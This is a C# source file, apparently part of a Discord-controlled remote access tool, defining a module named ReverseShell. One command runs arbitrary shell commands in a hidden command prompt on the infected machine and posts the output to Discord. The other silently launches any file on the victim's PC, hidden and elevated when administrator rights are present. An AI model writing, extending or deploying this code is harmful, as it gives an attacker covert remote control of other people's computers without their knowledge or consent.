using System.Diagnostics;
using System.IO;
using Discord.Commands;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class ReverseShell : ModuleBase<SocketCommandContext>
    {
        [Command("cmd")]
        [Summary("Opens A Hidden Command Prompt And Executes Commands")]
        public async Task CMD([Remainder] string cmd)
        {
            var proc = Utils.App.execute(cmd);
            await ReplyAsync($"Command: \"{cmd}\" Executed.\nOutput: {proc.StandardOutput.ReadToEnd()}");
        }

        [Command("execute")]
        [Summary("Runs A Specific File On The User's PC")]
        public async Task Execute(string filepath, bool NoWindow = true, bool Minimized = true)
        {
            if (File.Exists(filepath))
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = filepath,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = NoWindow,
                    WindowStyle = (Minimized) ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Minimized,
                    Verb = Utils.App.IsAdmin() ? "runas" : ""
                });
                await ReplyAsync("File As Been Run.");
            }
            else
            {
                await ReplyAsync("File Path Doesn't Exist.");
            }
        }
    }
}